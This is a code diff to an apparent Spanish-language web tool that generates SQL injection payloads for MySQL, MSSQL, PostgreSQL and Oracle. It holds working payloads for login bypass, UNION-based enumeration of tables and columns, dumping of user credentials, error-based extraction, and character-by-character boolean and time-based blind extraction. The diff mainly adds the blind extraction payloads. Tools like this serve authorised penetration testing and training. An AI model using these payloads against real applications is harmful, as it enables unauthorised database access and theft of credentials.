@@ -5142,7 +5142,7 @@ const SQLI_TYPES={
   union:{label:'UNION-based', tag:'in-band', hint:'ves los datos de la query en la página'},
   error:{label:'Error-based', tag:'in-band', hint:'no ves datos, pero la app muestra errores SQL'},
   bool: {label:'Blind booleano', tag:'blind', hint:'la respuesta cambia con verdadero/falso, sin ver datos'},
-  time: {label:'Blind por tiempo', tag:'blind', hint:'solo lo notas por el retardo (ni datos ni errores)'},
+  time: {label:'Blind time', tag:'blind', hint:'solo lo notas por el retardo (ni datos ni errores)'},
 };
 const SQLI_DB={
   mysql:   {name:'MySQL/MariaDB', c:'-- -', ver:'@@version',  timeInj:"' AND SLEEP(5)-- -"},
@@ -5151,7 +5151,7 @@ const SQLI_DB={
   oracle:  {name:'Oracle',        c:'--',   ver:'banner',     timeInj:"' AND 1=dbms_pipe.receive_message('a',5)--"},
 };
 function sqliPayloads(dbms, cat){
-  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c, v=db.ver;
+  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c;
   switch(cat){
     case 'detect': return [
       {code:"'",              d:'Comilla simple — si da error SQL o cambia la respuesta, es candidato'},
@@ -5163,9 +5163,6 @@ function sqliPayloads(dbms, cat){
       {code:"' UNION SELECT @@version-- -",            d:'Si @@version funciona → MySQL o MSSQL (mira el texto que devuelve)'},
       {code:"' UNION SELECT version()-- -",            d:'Si version() funciona → MySQL o PostgreSQL'},
       {code:"' UNION SELECT banner FROM v$version-- ",  d:'Si v$version funciona → Oracle'},
-      {code:"' AND '1'||'1'='11",                      d:"Si la concatenación || da '11' → PostgreSQL u Oracle (en MySQL || es OR lógico)"},
-      {code:"' AND '1'+'1'='11",                       d:'Si la concatenación con + da 11 → MSSQL'},
-      {code:"' AND SLEEP(5)-- -",                      d:'Si tarda ~5s → MySQL (SLEEP). MSSQL usa WAITFOR DELAY; PostgreSQL, pg_sleep()'},
     ];
     case 'login': return [
       {code:`' OR 1=1${c}`,   d:'Condición siempre verdadera y comenta el resto de la query'},
@@ -5173,9 +5170,8 @@ function sqliPayloads(dbms, cat){
       {code:"' OR '1'='1",    d:'Bypass clásico sin comentario — cierra la comilla abierta'},
     ];
     case 'union': return [
-      {code:`' ORDER BY 1${c}`,          d:'Sube el número hasta que dé error: son las columnas de la query'},
-      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs hasta que no dé error (mismo nº de columnas)'},
-      {code:`' UNION SELECT ${v},NULL${c}`, d:'Coloca la versión en una columna visible (ajusta los NULLs)'},
+      {code:`' ORDER BY 1${c}`,          d:'Sube el número (1,2,3…) hasta que dé error: ese es el nº de columnas de la query'},
+      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs (UNION SELECT NULL,NULL,…) hasta que no dé error: mismo nº de columnas. Las que se muestren son las visibles'},
     ];
     case 'enum': return dbms==='oracle' ? [
       {code:`' UNION SELECT table_name,NULL FROM all_tables${c}`, d:'Listar tablas (Oracle no usa information_schema)'},
@@ -5185,13 +5181,39 @@ function sqliPayloads(dbms, cat){
       {code:`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='usuarios'${c}`, d:'Listar columnas de una tabla'},
       {code:`' UNION SELECT usuario,contrasena FROM usuarios${c}`, d:'Volcar credenciales una vez conoces tabla y columnas'},
     ];
-    case 'bool': return [
-      {code:`' AND SUBSTRING((SELECT ${v}),1,1)='5${c}`, d:'Inferir datos carácter a carácter según la respuesta (Oracle: SUBSTR)'},
-      {code:`' AND (SELECT COUNT(*) FROM information_schema.tables)>10${c}`, d:'Preguntar sí/no sobre la BD observando el cambio de respuesta'},
-    ];
-    case 'time': return [
-      {code:db.timeInj, d:'Si la respuesta tarda ~5s, la inyección es válida (útil cuando no hay salida visible)'},
-    ];
+    case 'bool': return ({
+      mysql:[
+        {code:"' AND ASCII(SUBSTRING((SELECT database()),1,1))>77-- -", d:'Búsqueda binaria del 1er carácter por su código ASCII: ajusta el 77 según responda verdadero/falso (mueve la posición 1,1 para el resto)'},
+        {code:"' AND SUBSTRING((SELECT database()),1,1)='a'-- -", d:'Comparación exacta carácter a carácter'},
+        {code:"' AND (SELECT COUNT(*) FROM information_schema.tables)>50-- -", d:'Pregunta sí/no sobre la BD (nº de tablas) según cambie la respuesta'},
+      ],
+      mssql:[
+        {code:"' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (MSSQL)'},
+        {code:"' AND LEN((SELECT TOP 1 name FROM sys.databases))=5-- ", d:'Averigua la longitud del dato antes de extraerlo'},
+      ],
+      postgres:[
+        {code:"' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (PostgreSQL)'},
+        {code:"' AND (SELECT current_database()) LIKE 'a%'-- ", d:'Comprobación por patrón (empieza por…)'},
+      ],
+      oracle:[
+        {code:"' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (Oracle usa SUBSTR)'},
+        {code:"' AND (SELECT user FROM dual) LIKE 'A%'-- ", d:'Comprobación por patrón'},
+      ],
+    })[dbms] || [];
+    case 'time': return ({
+      mysql:[
+        {code:"' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77, SLEEP(3), 0)-- -", d:'Si el carácter cumple la condición, la respuesta tarda ~3s → extracción por tiempo (mueve la posición y ajusta el 77)'},
+      ],
+      mssql:[
+        {code:"'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77) WAITFOR DELAY '0:0:3'-- ", d:'MSSQL: WAITFOR DELAY condicional según el carácter'},
+      ],
+      postgres:[
+        {code:"' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>77) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- ", d:'PostgreSQL: pg_sleep condicional con CASE'},
+      ],
+      oracle:[
+        {code:"' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT user FROM dual),1,1))>77) THEN dbms_pipe.receive_message('a',3) ELSE 1 END FROM dual) IS NOT NULL-- ", d:'Oracle: retardo condicional con dbms_pipe'},
+      ],
+    })[dbms] || [];
     case 'error': return ({
       mysql:[
         {code:"' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", d:'MySQL: el error XPATH muestra el dato tras el «~». Cambia la subconsulta por lo que quieras leer'},
@@ -5259,8 +5281,10 @@ function renderSqliGen(){
     else if(_sqliType==='bool') body=`<div class="enum-note" style="margin-bottom:8px;">Extracción carácter a carácter según cambie la respuesta (verdadero/falso).</div>`+_sqliCards(dbms,'bool');
     else if(_sqliType==='time') body=`<div class="enum-note" style="margin-bottom:8px;">Extracción carácter a carácter midiendo el retardo (cuando no hay ni datos ni errores).</div>`+_sqliCards(dbms,'time');
   }
-  // Extra siempre visible: bypass de login (es un caso aparte del flujo de extracción)
-  const login=`<div style="margin-top:14px;border-top:1px solid var(--border);padding-top:10px;"><div class="svc-lbl" style="margin-bottom:6px;">Aparte — Bypass de login</div>`+_sqliCards(dbms,'login')+`</div>`;
+  // Bloque independiente: bypass de login (caso aparte del flujo de extracción)
+  const login=`<div style="margin-top:16px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r);padding:12px;">
+    <div class="svc-lbl" style="margin-bottom:6px;">🔑 Bypass de login — caso aparte</div>
+    <div class="enum-note" style="margin-bottom:8px;">No forma parte del flujo de extracción de arriba: sirve para saltarte un formulario de autenticación.</div>`+_sqliCards(dbms,'login')+`</div>`;
   out.innerHTML=stepper+body+login;
 }
 
